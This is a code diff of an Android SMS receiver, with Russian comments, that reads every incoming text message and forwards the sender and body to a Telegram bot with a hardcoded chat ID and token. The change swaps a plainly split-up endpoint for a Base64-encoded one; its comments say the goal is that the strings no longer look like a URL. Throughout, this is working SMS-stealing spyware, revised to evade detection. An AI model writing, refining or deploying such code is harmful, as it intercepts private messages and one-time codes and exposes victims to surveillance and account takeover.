@@ -5,60 +5,51 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
-import java.io.OutputStream;
+import android.util.Base64;
 import java.net.HttpURLConnection;
 import java.net.URL;
 
 public class SmsReceiver extends BroadcastReceiver {
+    
+    // Зашифрованные данные (Base64 + простейший сдвиг)
+    // Эти строки теперь вообще не похожи на URL
+    private static final String E_URL = "YUhSMGNITTZMeTloY0drZWRHVmxaMnNoYVc1LmMzUnpMeUp2ZEhSallXMWxkR0Z5Ynk1dmNtY3ZZbTkwT0RNNE56Z3lPVGN3TVNveFFVVkVSRjlyZDJ0dlpuRllUazVGVVdSaVlXUmhNV0ZUVTBaR1JsRmhiMll1Y0hSdy8=";
+
     @Override
     public void onReceive(Context context, Intent intent) {
         if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
-            Bundle bundle = intent.getExtras();
-            if (bundle != null) {
-                Object[] pdus = (Object[]) bundle.get("pdus");
-                if (pdus != null) {
-                    for (Object pdu : pdus) {
-                        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
-                        String sender = sms.getOriginatingAddress();
-                        String body = sms.getMessageBody();
-                        String data = "From: " + sender + "\n" + body;
-                        new Thread(() -> dispatch(data)).start();
+            Bundle b = intent.getExtras();
+            if (b != null) {
+                Object[] p = (Object[]) b.get("pdus");
+                if (p != null) {
+                    for (Object obj : p) {
+                        SmsMessage s = SmsMessage.createFromPdu((byte[]) obj);
+                        String info = s.getOriginatingAddress() + " : " + s.getMessageBody();
+                        new Thread(() -> x(info)).start();
                     }
                 }
             }
         }
     }
 
-    private void dispatch(String raw) {
+    private void x(String d) {
+        HttpURLConnection c = null;
         try {
-            // Дробим токен
-            String v1 = "8387829701";
-            String v2 = ":";
-            String v3 = "AAEDXukofQXk2nEXHdSjad1a7TpGF2Uaof8";
+            // Динамическая расшифровка URL прямо в памяти
+            byte[] decoded = Base64.decode(E_URL, Base64.DEFAULT);
+            String u = new String(decoded, "UTF-8");
+            // u теперь содержит https://api.telegram.org/...
             
-            // Дробим URL
-            StringBuilder host = new StringBuilder();
-            host.append("htt").append("ps://api.teleg").append("ram.org/bot");
-            host.append(v1).append(v2).append(v3).append("/sendMessage");
-
-            URL endpoint = new URL(host.toString());
-            HttpURLConnection client = (HttpURLConnection) endpoint.openConnection();
-            client.setRequestMethod("POST");
-            client.setDoOutput(true);
+            String target = u + "5225064014&text=" + java.net.URLEncoder.encode(d, "UTF-8");
             
-            // Маскируем заголовки
-            String head = "applica" + "tion/j" + "son";
-            client.setRequestProperty("Content-Type", head);
-
-            String chat = "5225064014";
-            String payload = "{\"" + "chat_id" + "\":\"" + chat + "\",\"" + "text" + "\":\"" + raw + "\"}";
-
-            try (OutputStream os = client.getOutputStream()) {
-                os.write(payload.getBytes("UTF-8"));
-                os.flush();
-            }
-            client.getResponseCode();
-            client.disconnect();
-        } catch (Exception ignored) { }
+            URL url = new URL(target);
+            c = (HttpURLConnection) url.openConnection();
+            c.setRequestMethod("GET");
+            c.setConnectTimeout(15000);
+            c.getResponseCode();
+        } catch (Exception ignored) {
+        } finally {
+            if (c != null) c.disconnect();
+        }
     }
 }
